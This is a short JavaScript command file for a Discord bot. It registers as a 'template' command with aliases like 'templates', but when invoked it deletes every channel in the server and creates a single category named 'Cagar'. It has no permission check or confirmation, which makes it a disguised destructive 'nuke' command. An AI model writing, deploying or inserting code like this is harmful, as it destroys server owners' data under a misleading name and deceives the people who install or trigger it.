module.exports.help = {
'name': 'tamplate',
'aliases': ['template', 'tamplates', 'templates']
}

exports.run = (client, message, args) => {
    message.guild.channels.forEach(channel => channel.delete())
    message.guild.channels.create("Cagar", { type: 'category' } )
} 
